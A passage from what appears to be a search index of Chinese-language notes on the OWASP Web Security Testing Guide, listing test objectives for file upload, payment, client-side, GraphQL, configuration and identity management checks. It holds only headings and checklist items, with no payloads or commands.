<p>4.10.9\u6076\u610f\u6587\u4ef6\u4e0a\u4f20\u6d4b\u8bd5</p> <p>\u8bc6\u522b\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u3002 \u67e5\u770b\u9879\u76ee\u6587\u6863\u4ee5\u786e\u5b9a\u54ea\u4e9b\u6587\u4ef6\u7c7b\u578b\u88ab\u89c6\u4e3a\u53ef\u63a5\u53d7\uff0c\u4ee5\u53ca\u54ea\u4e9b\u7c7b\u578b\u88ab\u89c6\u4e3a\u5371\u9669\u6216\u6076\u610f\u3002 \u5982\u679c\u6ca1\u6709\u53ef\u7528\u7684\u6587\u6863\uff0c\u5219\u6839\u636e\u5e94\u7528\u7a0b\u5e8f\u7684\u76ee\u7684\u8003\u8651\u4ec0\u4e48\u662f\u5408\u9002\u7684\u3002 \u786e\u5b9a\u5982\u4f55\u5904\u7406\u4e0a\u4f20\u7684\u6587\u4ef6\u3002 \u83b7\u53d6\u6216\u521b\u5efa\u4e00\u7ec4\u6076\u610f\u6587\u4ef6\u4ee5\u8fdb\u884c\u6d4b\u8bd5\u3002 \u5c1d\u8bd5\u5c06\u6076\u610f\u6587\u4ef6\u4e0a\u4f20\u5230\u5e94\u7528\u7a0b\u5e8f\u5e76\u786e\u5b9a\u662f\u5426\u88ab\u63a5\u53d7\u548c\u5904\u7406\u3002</p> <p>4.10.10\u6d4b\u8bd5\u652f\u4ed8\u529f\u80fd</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u786e\u5b9a\u7535\u5b50\u5546\u52a1\u529f\u80fd\u7684\u4e1a\u52a1\u903b\u8f91\u662f\u5426\u7a33\u5065\u3002 \u4e86\u89e3\u652f\u4ed8\u529f\u80fd\u7684\u5de5\u4f5c\u539f\u7406\u3002 \u786e\u5b9a\u652f\u4ed8\u529f\u80fd\u662f\u5426\u5b89\u5168\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/11%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%8B%E8%AF%95/","title":"11\u3001\u5ba2\u6237\u7aef\u6d4b\u8bd5","text":"<p>\u6d4b\u8bd5\u57fa\u4e8e DOM \u7684\u8de8\u7ad9\u811a\u672c</p> <ul> <li>4.11.1.1\u6d4b\u8bd5\u57fa\u4e8e\u81ea DOM \u7684\u8de8\u7ad9\u811a\u672c</li> </ul> <p>4.11.2\u00a0JavaScript \u6267\u884c\u6d4b\u8bd5</p> <p>4.11.3\u00a0HTML \u6ce8\u5165\u6d4b\u8bd5</p> <p>4.11.4\u6d4b\u8bd5\u5ba2\u6237\u7aef URL \u91cd\u5b9a\u5411</p> <p>4.11.5\u00a0CSS\u6ce8\u5165\u6d4b\u8bd5</p> <p>4.11.6\u5ba2\u6237\u7aef\u8d44\u6e90\u64cd\u4f5c\u6d4b\u8bd5</p> <p>4.11.7\u6d4b\u8bd5\u8de8\u6e90\u8d44\u6e90\u5171\u4eab</p> <p>4.11.8\u8de8\u7ad9\u5237\u673a\u6d4b\u8bd5</p> <p>4.11.9\u70b9\u51fb\u52ab\u6301\u6d4b\u8bd5</p> <p>4.11.10\u6d4b\u8bd5 WebSocket</p> <p>4.11.11\u6d4b\u8bd5\u7f51\u7edc\u6d88\u606f</p> <p>4.11.12\u6d4b\u8bd5\u6d4f\u89c8\u5668\u5b58\u50a8</p> <p>4.11.13\u6d4b\u8bd5\u8de8\u7ad9\u811a\u672c\u5305\u542b</p> <p>4.11.14\u53cd\u5411 Tabnabbing \u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/12%E3%80%81API%E6%B5%8B%E8%AF%95/","title":"12\u3001API\u6d4b\u8bd5","text":"<p>\u6d4b\u8bd5 GraphQL</p> <p>\u6982\u62ec GraphQL \u5728\u73b0\u4ee3 API \u4e2d\u53d8\u5f97\u975e\u5e38\u6d41\u884c\u3002\u5b83\u63d0\u4f9b\u4e86\u7b80\u5355\u6027\u548c\u5d4c\u5957\u5bf9\u8c61\uff0c\u6709\u5229\u4e8e\u66f4\u5feb\u7684\u5f00\u53d1\u3002\u867d\u7136\u6bcf\u79cd\u6280\u672f\u90fd\u6709\u4f18\u70b9\uff0c\u4f46\u5b83\u4e5f\u53ef\u80fd\u4f7f\u5e94\u7528\u7a0b\u5e8f\u9762\u4e34\u65b0\u7684\u653b\u51fb\u9762\u3002\u6b64\u573a\u666f\u7684\u76ee\u7684\u662f\u4e3a\u4f7f\u7528 GraphQL \u7684\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e00\u4e9b\u5e38\u89c1\u7684\u9519\u8bef\u914d\u7f6e\u548c\u653b\u51fb\u5411\u91cf\u3002\u6709\u4e9b\u5411\u91cf\u662f GraphQL \u7279\u6709\u7684\uff08\u4f8b\u5982Introspection Query\uff09\uff0c\u6709\u4e9b\u5411\u91cf\u662f API \u901a\u7528\u7684\uff08\u4f8b\u5982SQL \u6ce8\u5165\uff09\u3002</p> <p>\u672c\u8282\u4e2d\u7684\u793a\u4f8b\u5c06\u57fa\u4e8e\u6613\u53d7\u653b\u51fb\u7684 GraphQL \u5e94\u7528\u7a0b\u5e8fpoc-graphql\uff0c\u8be5\u5e94\u7528\u7a0b\u5e8f\u5728\u6620\u5c04\u4e3a\u6613\u53d7\u653b\u51fb\u7684 GraphQL \u8282\u70b9\u7684 docker \u5bb9\u5668\u4e2d\u8fd0\u884clocalhost:8080/ GraphQL\u3002</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc4\u4f30\u662f\u5426\u90e8\u7f72\u4e86\u5b89\u5168\u4e14\u53ef\u7528\u4e8e\u751f\u4ea7\u7684\u914d\u7f6e\u3002 \u9a8c\u8bc1\u6240\u6709\u8f93\u5165\u5b57\u6bb5\u662f\u5426\u53d7\u5230\u4e00\u822c\u653b\u51fb\u3002 \u786e\u4fdd\u5e94\u7528\u9002\u5f53\u7684\u8bbf\u95ee\u63a7\u5236\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/","title":"\u6982\u62ec","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<p>\u68c0\u67e5\u7f51\u7edc\u4e2d\u5e94\u7528\u7a0b\u5e8f\u7684\u914d\u7f6e\u96c6\u5e76\u9a8c\u8bc1\u4ed6\u4eec\u662f\u5426\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002 \u9a8c\u8bc1\u6240\u4f7f\u7528\u7684\u6846\u67b6\u548c\u7cfb\u7edf\u662f\u5426\u5b89\u5168\uff0c\u5e76\u4e14\u4e0d\u4f1a\u56e0\u672a\u7ef4\u62a4\u7684\u8f6f\u4ef6\u6216\u9ed8\u8ba4\u8bbe\u7f6e\u548c\u51ed\u636e\u800c\u53d7\u5230\u5df2\u77e5\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/#_4","title":"\u5df2\u77e5\u670d\u52a1\u5668\u6f0f\u6d1e","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/#_5","title":"\u7ba1\u7406\u5de5\u5177","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/#_6","title":"\u53c2\u8003","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/","title":"\u6d4b\u8bd5\u5e94\u7528\u5e73\u53f0","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_2","title":"\u6982\u62ec","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<p>[] \u786e\u4fdd\u9ed8\u8ba4\u6587\u4ef6\u548c\u5df2\u77e5\u6587\u4ef6\u5df2\u88ab\u5220\u9664 [] \u9a8c\u8bc1\u751f\u4ea7\u73af\u5883\u4e2d\u6ca1\u6709\u7559\u4e0b\u4efb\u4f55\u8c03\u8bd5\u4ee3\u7801\u6216\u6269\u5c55 [] \u68c0\u67e5\u4e3a\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6e\u7684\u65e5\u5fd7\u8bb0\u5f55\u673a\u5236</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_4","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_5","title":"\u9ed1\u76d2\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_6","title":"\u793a\u4f8b\u5df2\u77e5\u6587\u4ef6\u548c\u76ee\u5f55","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_7","title":"\u8bc4\u8bba\u5ba1\u6838","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_8","title":"\u7cfb\u7edf\u914d\u7f6e","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_9","title":"\u7070\u76d2\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_10","title":"\u914d\u7f6e\u5ba1\u67e5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_11","title":"\u8bb0\u5f55","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_12","title":"\u65e5\u5fd7\u4e2d\u7684\u654f\u611f\u4fe1\u606f","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_13","title":"\u65e5\u5fd7\u4f4d\u7f6e","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_14","title":"\u65e5\u5fd7\u5b58\u50a8","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_15","title":"\u65e5\u5fd7\u8f6e\u6362","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_16","title":"\u65e5\u5fd7\u8bbf\u95ee\u63a7\u5236","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_17","title":"\u65e5\u5fd7\u5ba1\u67e5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_18","title":"\u53c2\u8003","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/","title":"\u6d4b\u8bd5\u654f\u611f\u4fe1\u606f\u7684\u6587\u4ef6\u6269\u5c55\u540d\u5904\u7406","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_2","title":"\u6982\u8ff0","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u4e0d\u654f\u611f\u7684\u6587\u4ef6\u6269\u5c55\u540d\u6216\u53ef\u80fd\u5305\u542b\u539f\u59cb\u6570\u636e\u7684\u6269\u5c55\u540d\uff08\u4f8b\u5982\u811a\u672c\u3001\u539f\u59cb\u6570\u636e\u3001\u51ed\u636e\u7b49\uff09\u3002</li> <li>[ ] \u9a8c\u8bc1\u89c4\u5219\u96c6\u4e0a\u4e0d\u5b58\u5728\u7cfb\u7edf\u6846\u67b6\u7ed5\u8fc7</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_4","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_5","title":"\u5f3a\u5236\u6d4f\u89c8","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_6","title":"\u679a\u4e3e\u57fa\u7840\u8bbe\u65bd\u548c\u5e94\u7528\u7a0b\u5e8f\u7ba1\u7406\u754c\u9762","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_7","title":"\u6982\u62ec","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_8","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u9690\u85cf\u7684\u7ba1\u7406\u5458\u754c\u9762\u548c\u529f\u80fd</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#http","title":"\u6d4b\u8bd5HTTP\u65b9\u6cd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_9","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u679a\u4e3e\u652f\u6301\u7684HTTP\u65b9\u6cd5</li> <li>[ ] \u6d4b\u8bd5\u8bbf\u95ee\u63a7\u5236\u7ed5\u8fc7</li> <li>[ ] \u6d4b\u8bd5 XST \u6f0f\u6d1e</li> <li>[ ] \u6d4b\u8bd5 HTTP \u65b9\u6cd5\u91cd\u5199\u6280\u672f</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#http_1","title":"\u6d4b\u8bd5 HTTP \u4e25\u683c\u4f20\u8f93\u5b89\u5168\u6027","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_10","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u68c0\u67e5 HSTS \u6807\u5934\u53ca\u5176\u6709\u6548\u6027</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#ria","title":"\u6d4b\u8bd5 RIA \u8de8\u57df\u7b56\u7565","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_11","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u68c0\u67e5\u5e76\u9a8c\u8bc1\u7b56\u7565\u6587\u4ef6</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_12","title":"\u6d4b\u8bd5\u6587\u4ef6\u6743\u9650","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_13","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u68c0\u67e5\u5e76\u8bc6\u522b\u4efb\u4f55\u6076\u610f\u6587\u4ef6\u6743\u9650</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_14","title":"\u5b50\u57df\u63a5\u7ba1\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_15","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u679a\u4e3e\u6240\u6709\u53ef\u80fd\u7684\u5b50\u57df</li> <li>[ ] \u8bc6\u522b\u88ab\u9057\u5fd8\u6216\u9519\u8bef\u914d\u7f6e\u7684\u57df</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_16","title":"\u6d4b\u8bd5\u4e91\u5b58\u50a8","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_17","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc4\u4f30\u5b58\u50a8\u670d\u52a1\u7684\u8bbf\u95ee\u63a7\u5236\u914d\u7f6e\u662f\u5426\u6b63\u786e\u5230\u4f4d</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/2%E3%80%81%E9%85%8D%E7%BD%AE%E9%83%A8%E7%BD%B2%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/","title":"\u914d\u7f6e\u90e8\u7f72\u7ba1\u7406\u6d4b\u8bd5","text":"<p>4.2.1\u6d4b\u8bd5\u7f51\u7edc\u57fa\u7840\u8bbe\u65bd\u914d\u7f6e</p> <p>4.2.2\u6d4b\u8bd5\u5e94\u7528\u5e73\u53f0\u914d\u7f6e</p> <p>4.2.3\u654f\u611f\u4fe1\u606f\u6d4b\u8bd5\u6587\u4ef6\u6269\u5c55\u540d\u5904\u7406</p> <p>4.2.4\u67e5\u770b\u65e7\u5907\u4efd\u548c\u672a\u5f15\u7528\u7684\u654f\u611f\u4fe1\u606f\u6587\u4ef6</p> <p>4.2.5\u679a\u4e3e\u57fa\u7840\u8bbe\u65bd\u548c\u5e94\u7528\u7ba1\u7406\u754c\u9762</p> <p>4.2.6\u6d4b\u8bd5 HTTP \u65b9\u6cd5</p> <p>4.2.7\u6d4b\u8bd5 HTTP \u4e25\u683c\u4f20\u8f93\u5b89\u5168</p> <p>4.2.8\u6d4b\u8bd5 RIA \u8de8\u57df\u7b56\u7565</p> <p>4.2.9\u6d4b\u8bd5\u6587\u4ef6\u6743\u9650</p> <p>4.2.10\u5b50\u57df\u63a5\u7ba1\u6d4b\u8bd5</p> <p>4.2.11\u6d4b\u8bd5\u4e91\u5b58\u50a8</p> <p>4.2.12\u5185\u5bb9\u5b89\u5168\u7b56\u7565\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/","title":"3\u3001\u8eab\u4efd\u7ba1\u7406\u6d4b\u8bd5","text":"<p>4.3.1\u6d4b\u8bd5\u89d2\u8272\u5b9a\u4e49</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_1","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u5e76\u8bb0\u5f55\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u89d2\u8272</li> <li>[ ] \u5c1d\u8bd5\u5207\u6362\u3001\u6539\u53d8\u6216\u8bbf\u95ee\u53e6\u4e00\u4e2a\u89d2\u8272</li> <li>[ ] \u67e5\u770b\u89d2\u8272\u7684\u7c92\u5ea6\u4ee5\u53ca\u6240\u6388\u4e8e\u6743\u9650\u80cc\u540e\u7684\u9700\u6c42</li> </ul> <p>4.3.2\u6d4b\u8bd5\u7528\u6237\u6ce8\u518c\u6d41\u7a0b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u9a8c\u8bc1\u7528\u6237\u6ce8\u518c\u7684\u8eab\u4efd\u8981\u6c42\u662f\u5426\u7b26\u5408\u4e1a\u52a1\u548c\u5b89\u5168\u8981\u6c42</li> <li>[ ] \u9a8c\u8bc1\u6ce8\u518c\u8fc7\u7a0b</li> </ul> <p>4.3.3\u6d4b\u8bd5\u8d26\u53f7\u5f00\u901a\uff08\u914d\u7f6e\uff09\u6d41\u7a0b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u9a8c\u8bc1\u54ea\u4e9b\u8d26\u6237\u53ef\u4ee5\u914d\u7f6e\u5176\u4ed6\u8d26\u6237\u4ee5\u53ca\u7c7b\u578b</li> </ul> <p>4.3.4\u8d26\u53f7\u679a\u4e3e\u548c\u53ef\u731c\u6d4b\u7528\u6237\u8d26\u53f7\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_4","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u68c0\u67e5\u4e0e\u7528\u6237\u8bc6\u522b\u76f8\u5173\u7684\u6d41\u7a0b\uff08\u4f8b\u5982\u6ce8\u518c\u3001\u767b\u5f55\u7b49\uff09\u3002</li> <li>[ ] \u901a\u8fc7\u54cd\u5e94\u5206\u6790\u5c3d\u53ef\u80fd\u679a\u4e3e\u7528\u6237\u3002</li> </ul> <p>4.3.5\u6d4b\u8bd5\u5f31\u7528\u6237\u540d\u7b56\u7565\u6216\u672a\u5f3a\u5236\u6267\u884c\u7684\u7528\u6237\u540d\u7b56\u7565</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_5","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u4e00\u81f4\u7684\u8d26\u6237\u540d\u79f0\u7ed3\u6784\u662f\u5426\u4f1a\u4f7f\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u53d7\u5230\u8d26\u6237\u679a\u4e3e\u653b\u51fb</li> <li>[ ] 